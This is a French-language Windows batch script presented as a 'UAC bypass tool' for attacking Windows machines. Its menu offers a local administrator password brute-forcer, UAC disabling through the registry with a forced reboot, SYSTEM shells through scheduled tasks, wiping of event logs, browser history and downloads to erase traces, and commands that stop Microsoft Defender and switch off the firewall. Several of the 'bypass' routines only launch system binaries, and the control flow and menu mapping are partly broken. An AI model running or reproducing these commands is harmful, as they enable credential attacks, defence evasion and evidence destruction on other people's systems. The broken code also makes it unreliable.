@echo off

chcp 65001 >nul
color 0B  

CLS
echo.
echo ================================================================================ 
echo                        UAC BYPASS TOOL WITH CHECKER 
echo ================================================================================ 
echo.

:: Menu principal
:menu
color 0B
CLS
echo.
echo  ░  ░░░░  ░░░      ░░░░      ░░░░░░░░░       ░░░  ░░░░  ░░       ░░░░      ░░░░      ░░░░      ░░
echo  ▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒▒  ▒▒  ▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒
echo  ▓  ▓▓▓▓  ▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓    ▓▓▓▓       ▓▓▓  ▓▓▓▓  ▓▓▓      ▓▓▓▓      ▓▓
echo  █  ████  ██        ██  ████  ████████  ████  █████  █████  ████████        ████████  ████████  █
echo  ██      ███  ████  ███      █████████       ██████  █████  ████████  ████  ███      ████      ██
echo.
echo ================================================================================ 
echo                   MENU - CHOISISSEZ UNE OPTION        
echo ================================================================================ 
echo.
echo [1] Vérifier si le système est vulnérable au contournement UAC
echo [2] Utiliser un contournement UAC
echo [3] Contournement personnalisé pour un programme
echo [4] Réinitialiser les modifications du registre
echo [5] Supprimer les logs et traces (historique, téléchargements, etc.)
echo [6] Forcer l'arrêt de Microsoft Defender, Pare-feu et Proxy
echo [7] Vérifier les Privilèges
echo [8] Accéder à CMD ADMIN
echo [9] Connexion à RUNAS ADMIN
echo [10] Désactiver UAC (EnableLUA = 0)
echo [11] Activer UAC (EnableLUA = 1)
echo [12] BruteForce USER -admin-
echo [13] Quitter
echo.
set /p choice=[+] Choisissez une option: 

IF "%choice%"=="1" goto check_vuln
IF "%choice%"=="2" goto uac_bypass
IF "%choice%"=="3" goto custom_bypass
IF "%choice%"=="4" goto reset_changes
IF "%choice%"=="5" goto clear_traces
IF "%choice%"=="6" goto stop_defender
IF "%choice%"=="7" goto check_privileges
If "%choice%"=="8" goto cmd_bypass
IF "%choice%"=="9" goto brute_force_runas
IF "%choice%"=="10" goto  DISABLE_UAC
IF "%choice%"=="11" goto ENABLE_UAC
IF "%choice%"=="12" goto start
IF "%choice%"=="13" goto end

echo [!] Choix invalide, essayez encore !
timeout /t 2 >nul
goto menu

:start
CLS
set error=-
set user=""
set wordlist=""
echo.
echo      ___.                 __          _____                           
echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
echo       ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
echo       ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/ 
echo       ^|___  /__^|  ^|____/ ^|__^|  \___  ^>__^|  \____/^|__^|    \___  ^>___  ^>
echo           \/                       \/                        \/    \/ 
echo.
echo    ╔════════════════════╗
echo    ║  COMMANDS:         ║
echo    ║                    ║
echo    ║  1. List Users     ║
echo    ║  2. Bruteforce     ║
echo    ║  3. Exit           ║
echo    ╚════════════════════╝
:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto bruteforce
)

if /I "%errorlevel%" EQU "3" (
  goto menu
)

:bruteforce
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto menu
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mUser doesn't exist[0m
  pause > nul
  goto bruteforce
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found[0m
pause >nul


:success
echo.
echo [92m[+][0m [97mPassword found: %pass%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul


:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto success
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success

:: Disable UAC
:DISABLE_UAC
echo [+] Désactivation de l'UAC...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
echo [+] L'UAC a été désactivé avec succès. Vous devrez peut-être redémarrer l'ordinateur pour que les modifications prennent effet.
pause
goto MENU

:: Enable UAC
:ENABLE_UAC
echo [+] Activation de l'UAC...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 1 /f
echo [+] L'UAC a été activé avec succès. Vous devrez peut-être redémarrer l'ordinateur pour que les modifications prennent effet.
pause
goto MENU

:brute_force_runas

setlocal enabledelayedexpansion

:: Définir le nom d'utilisateur
set "username=Administrator"

:: Demander le mot de passe de l'utilisateur
set /p password=[INFO] Entrez le mot de passe pour %username% : 

echo [INFO] Tentative d'exécution de cmd via runas avec le mot de passe...

:: Tentative de lancer cmd avec le mot de passe actuel
echo [INFO] Tentative avec le mot de passe : !password!

:: Utiliser runas pour ouvrir cmd
runas /user:%username% "cmd.exe /K echo [INFO] cmd lancé en administrateur via runas"

:: Vérifier le code de sortie de runas
if %errorlevel% == 0 (
    echo [INFO] cmd a été ouvert avec succès en administrateur via runas.
) else (
    echo [ERROR] Impossible de lancer cmd avec ce mot de passe. Code d'erreur : %errorlevel%
)

pause
goto menu



:cmd_bypass
: Script automatique pour exécuter cmd en mode administrateur avec plusieurs approches légales

setlocal enabledelayedexpansion

:: Méthode 1: Utilisation de runas (demande d'élévation sans mot de passe)
echo [INFO] Tentative d'exécution de cmd via runas sans mot de passe...
runas /user:Administrator "cmd.exe /K echo [INFO] cmd lancé en administrateur"
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès en administrateur via runas.
    pause
    
)

:: Méthode 2: Utilisation de PowerShell pour demander une élévation sans mot de passe
echo [INFO] Tentative d'exécution via PowerShell sans mot de passe...
powershell -Command "Start-Process cmd -Verb runAs"
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès via PowerShell en administrateur.
    pause
    
)

:: Méthode 3: Utilisation de la tâche planifiée pour exécuter cmd en tant qu'administrateur
echo [INFO] Tentative d'exécution via une tâche planifiée...
schtasks /create /tn "CmdAsAdmin" /tr "cmd.exe" /sc once /st 00:00 /ru "SYSTEM" >nul 2>&1
schtasks /run /tn "CmdAsAdmin" >nul 2>&1
if %errorlevel% equ 0 (
    schtasks /delete /tn "CmdAsAdmin" >nul 2>&1
    echo [INFO] cmd a été ouvert avec succès via tâche planifiée.
    pause
    
)

:: Méthode 4: Utilisation de l'invite UAC sans mot de passe
echo [INFO] Tentative d'exécution via une invite UAC sans mot de passe...
powershell -Command "Start-Process cmd -Verb runAs"
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès via UAC.
    pause
    
)

:: Méthode 5: Utilisation de la commande "at" pour créer une tâche planifiée (version plus ancienne)
echo [INFO] Tentative d'exécution via la commande at...
at 12:00 /interactive cmd.exe
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès via la commande at.
    pause
    
)

:: Méthode 6: Utilisation de la commande "PsExec" de Sysinternals (nécessite PsExec téléchargé)
echo [INFO] Tentative d'exécution via PsExec...
psexec -h -i cmd.exe
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès via PsExec.
    pause
    
)

:: Méthode 7: Utilisation de la commande "Scheduled Tasks" en PowerShell
echo [INFO] Tentative d'exécution via une tâche planifiée en PowerShell...
powershell -Command "Start-ScheduledTask -TaskName 'CmdAsAdmin'"
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès via ScheduledTask PowerShell.
    pause
    
)

:: Méthode 8: Utilisation du processus "explorer" en mode administrateur
echo [INFO] Tentative d'exécution via explorer.exe en mode administrateur...
explorer.exe "cmd.exe"
if %errorlevel% equ 0 (
    echo [INFO] cmd a été ouvert avec succès via explorer.exe.
    pause
    
)

:: Méthode 9: Utilisation de la clé de registre pour contourner UAC (méthode risquée, non recommandée)
echo [INFO] Tentative d'exécution via modification du registre...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
shutdown /r /t 0
echo [INFO] cmd devrait s'exécuter automatiquement après redémarrage, si la méthode fonctionne.
pause


:: Si aucune méthode n'a fonctionné
echo [ERROR] Impossible d'ouvrir cmd en mode administrateur. Assurez-vous d'avoir les privilèges nécessaires.
pause
goto menu


:check_privileges
CLS
echo ================================================================================ 
echo                     [VERIFICATION DU NIVEAU DE PRIVILEGE]
echo ================================================================================ 
echo.

:: Vérification des privilèges actuels
echo [+] Vérification des privilèges actuels...
whoami /priv > temp_privileges.txt

:: Affichage des privilèges critiques
echo [+] Privilèges critiques :
echo ---------------------------------
setlocal enabledelayedexpansion
for /f "tokens=*" %%A in (temp_privileges.txt) do (
    if "%%A" == "SeTakeOwnershipPrivilege" (
        set "ownership_state=%%B"
    ) else if "%%A" == "SeDebugPrivilege" (
        set "debug_state=%%B"
    )
)
endlocal

:: Vérification de l'appartenance au groupe Administrateurs
echo [+] Vérification de l'appartenance au groupe Administrateurs...
whoami /groups | find "S-1-5-32-544" >nul
IF ERRORLEVEL 1 (
    set "admin_group=false"
) ELSE (
    set "admin_group=true"
)

:: Détermination du statut
if "%admin_group%" == "true" (
    if "%ownership_state%" == "Enabled" and "%debug_state%" == "Enabled" (
        echo [!] Statut : Administrateur complet
    ) else (
        echo [!] Statut : Administrateur partiel
    )
) else (
    echo [!] Statut : Utilisateur simple
)

:: Suggestions pour élever les privilèges
echo ================================================================================ 
echo [+] Solutions pour élever vos privilèges :
echo     - Si vous manquez des privilèges critiques, utilisez 'secpol.msc' pour les activer.
echo     - Utilisez PowerShell pour ajouter des privilèges à votre utilisateur local.
echo     - Si vous avez accès à un autre compte administrateur, utilisez 'PsExec' ou 'WinRM' pour exécuter des commandes à distance.
echo ================================================================================

:: Nettoyage des fichiers temporaires
del temp_privileges.txt

pause
goto menu



:: Vérification de la vulnérabilité UAC
:check_vuln
CLS
echo.
echo ================================================================================ 
echo        VERIFICATION DE LA VULNERABILITE UAC      
echo ================================================================================ 
echo.

:: Initialisation des variables pour un meilleur suivi
setlocal enabledelayedexpansion
set "reg_keys[0]=HKCU\Software\Classes\ms-settings\shell\open\command"
set "reg_keys[1]=HKCU\Software\Classes\mscfile\shell\open\command"
set "reg_keys[2]=HKCU\Software\Classes\exefile\shell\open\command"
set "reg_keys[3]=HKCU\Software\Classes\taskmgr\shell\open\command"
set "reg_keys[4]=HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
set "vulnerable=0"

:: Vérification des permissions d'écriture dans le registre pour chaque clé définie
echo [+] Vérification des permissions d'écriture pour les clés de contournement UAC...

for /L %%i in (0,1,4) do (
    set key=!reg_keys[%%i]!
    echo [+] Vérification de la clé : !key!
    reg query "!key!" >nul 2>&1
    IF ERRORLEVEL 1 (
        echo [!] La clé !key! est sécurisée.
    ) ELSE (
        echo [!] Permissions d'écriture trouvées pour !key!
        echo [*] Le système pourrait être vulnérable au contournement UAC via cette clé.
        set /a vulnerable+=1
    )
    echo.
)

:: Résultat final
echo ================================================================================ 
IF !vulnerable! GEQ 1 (
    echo [+] Le système présente des vulnérabilités potentielles liées au contournement UAC.
    echo [*] Le système pourrait être vulnérable à une ou plusieurs techniques de contournement UAC.
) ELSE (
    echo [+] Le système semble sécurisé contre les contournements UAC standards.
)
echo ================================================================================ 
pause
goto menu



echo.
echo ================================================================================ 
echo     VERIFICATION TERMINEE - VERIFIEZ LES RESULTATS     
echo ================================================================================ 
pause
goto menu

:: Contournement UAC
:uac_bypass
CLS
echo ================================================================================ 
echo                         CONTOURNEMENT UAC 
echo ================================================================================ 
echo.
echo [1] Eventvwr.exe Bypass
echo [2] Fodhelper.exe Bypass
echo [3] Computerdefaults.exe Bypass
echo [4] Sdclt.exe Bypass
echo [5] Slui.exe Bypass
echo [6] Perfmon.exe Bypass
echo [7] Taskmgr.exe Bypass
echo [8] Sysprep.exe Bypass
echo [9] Control.exe with /computername
echo [10] Quitter
echo.
set /p bypass_option=[+] Choisissez une technique de contournement UAC: 

IF "%bypass_option%"=="1" goto eventvwr_bypass
IF "%bypass_option%"=="2" goto fodhelper_bypass
IF "%bypass_option%"=="3" goto computerdefaults_bypass
IF "%bypass_option%"=="4" goto sdclt_bypass
IF "%bypass_option%"=="5" goto slui_bypass
IF "%bypass_option%"=="6" goto perfmon_bypass
IF "%bypass_option%"=="7" goto taskmgr_bypass
IF "%bypass_option%"=="8" goto sysprep_bypass
IF "%bypass_option%"=="9" goto control_bypass
IF "%bypass_option%"=="10" goto menu
echo [!] Choix invalide, essayez encore !
timeout /t 2 >nul
goto uac_bypass

:: Eventvwr.exe Bypass
:eventvwr_bypass
echo [+] Tentative de contournement avec Eventvwr.exe...
start eventvwr.exe
echo [+] Eventvwr.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Fodhelper.exe Bypass
:fodhelper_bypass
echo [+] Tentative de contournement avec Fodhelper.exe...
start %windir%\System32\fodhelper.exe
echo [+] Fodhelper.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Computerdefaults.exe Bypass
:computerdefaults_bypass
echo [+] Tentative de contournement avec Computerdefaults.exe...
start %windir%\System32\computerdefaults.exe
echo [+] Computerdefaults.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Sdclt.exe Bypass
:sdclt_bypass
echo [+] Tentative de contournement avec Sdclt.exe...
start %windir%\System32\sdclt.exe
echo [+] Sdclt.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Slui.exe Bypass
:slui_bypass
echo [+] Tentative de contournement avec Slui.exe...
start %windir%\System32\slui.exe
echo [+] Slui.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Perfmon.exe Bypass
:perfmon_bypass
echo [+] Tentative de contournement avec Perfmon.exe...
start %windir%\System32\perfmon.exe
echo [+] Perfmon.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Taskmgr.exe Bypass
:taskmgr_bypass
echo [+] Tentative de contournement avec Taskmgr.exe...
start %windir%\System32\taskmgr.exe
echo [+] Taskmgr.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Sysprep.exe Bypass
:sysprep_bypass
echo [+] Tentative de contournement avec Sysprep.exe...
start %windir%\System32\sysprep.exe
echo [+] Sysprep.exe lancé, en attente de la levée du UAC...
pause
goto uac_bypass

:: Control.exe avec /computername Bypass
:control_bypass
echo [+] Tentative de contournement avec Control.exe...
start %windir%\System32\control.exe /computername
echo [+] Control.exe avec /computername lancé, en attente de la levée du UAC...
pause
goto uac_bypass


:: Méthode de contournement du programme personnalisé
:custom_bypass
CLS
echo ================================================================================ 
echo                     CONTEXTE DE CONTOURNEMENT PERSONNALISÉ 
echo ================================================================================ 
echo.
echo [*] Entrez le chemin complet du programme à contourner (ex: C:\Program Files\example.exe) :
set /p program_path=[+] Chemin du programme : 

:: Tentatives de contournement améliorées pour éviter les erreurs
echo [+] Tentatives de contournement pour : %program_path%
echo [+] Utilisation de la méthode runas pour exécuter %program_path%

:: Contournement avec méthodes diverses
echo [+] Tentative avec "runas" sans mot de passe...
runas /user:Administrator "%program_path%" /savecred

echo [+] Tentative avec "cmd /c start"...
cmd /c start %program_path%

echo [+] Tentative avec "start" avec arguments...
start %program_path%

echo [+] Tentative avec PowerShell RunAs...
powershell -Command "Start-Process '%program_path%' -Verb RunAs"

echo [+] Tentative avec la méthode classique (cmd)...
cmd /c "%program_path%"

echo.
echo [+] Contournement personnalisé terminé pour : %program_path%
pause
goto menu

:: Réinitialisation des changements dans le registre
:reset_changes
CLS
echo.
echo ================================================================================ 
echo          REINITIALISATION DES MODIFICATIONS DU REGISTRE        
echo ================================================================================ 
echo [+] Suppression des clés de registre de contournement UAC...
reg delete "HKCU\Software\Classes\mscfile\shell\open\command" /f >nul 2>&1
reg delete "HKCU\Software\Classes\ms-settings\shell\open\command" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f >nul 2>&1
reg delete "HKCU\Software\Classes\exefile\shell\open\command" /f >nul 2>&1
reg delete "HKCU\Software\Classes\taskmgr\shell\open\command" /f >nul 2>&1
reg delete "HKCU\Software\Classes\AppID\{921C1A8B-9F15-4DA4-9235-0472C3A216E6}" /f >nul 2>&1
echo [+] Réinitialisation des modifications réussie.
pause
goto menu

:: Suppression des logs et traces
:clear_traces
CLS
echo ================================================================================ 
echo                    SUPPRESSION DES LOGS, TELECHARGEMENTS, ET HISTORIQUES 
echo ================================================================================ 
echo [+] Suppression des logs système et des historiques (téléchargements, navigation, etc.)...

:: Suppression des logs
del /q /f "C:\Windows\System32\winevt\Logs\*" >nul 2>&1

:: Suppression de l'historique de téléchargement
del /q /f "%USERPROFILE%\Downloads\*" >nul 2>&1

:: Suppression des historiques de navigation dans Chrome, Edge, etc.
del /q /f "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" >nul 2>&1
del /q /f "%APPDATA%\Microsoft\Windows\Recent\*" >nul 2>&1

:: Suppression des traces diverses
del /q /f "%APPDATA%\Microsoft\Windows\Recent\*" >nul 2>&1
del /q /f "%LOCALAPPDATA%\Temp\*" >nul 2>&1

echo [+] Suppression des logs et traces terminée.
pause
goto menu

:: Désactivation de Microsoft Defender, du pare-feu et du proxy
:disable_defender_firewall_proxy
CLS
echo ================================================================================ 
echo               ARRET DE MICROSOFT DEFENDER, PARE-FEU ET PROXY 
echo ================================================================================ 
echo.

:: Forcer l'arrêt de Microsoft Defender, Pare-feu et Proxy
:stop_defender
CLS
echo ================================================================================ 
echo            ARRET DE MICROSOFT DEFENDER, PARE-FEU ET PROXY 
echo ================================================================================ 
echo [+] Tentative de désactivation de Microsoft Defender...
echo.
sc stop WinDefend
sc config WinDefend start= disabled

echo [+] Tentative de désactivation du pare-feu Windows...
netsh advfirewall set allprofiles state off

echo [+] Tentative de désactivation du proxy...
netsh winhttp reset proxy
echo.

echo [+] Désactivation de Defender, pare-feu et proxy réussie.
echo.
pause
goto menu

:end
echo.
echo [+] Au revoir !
exit /b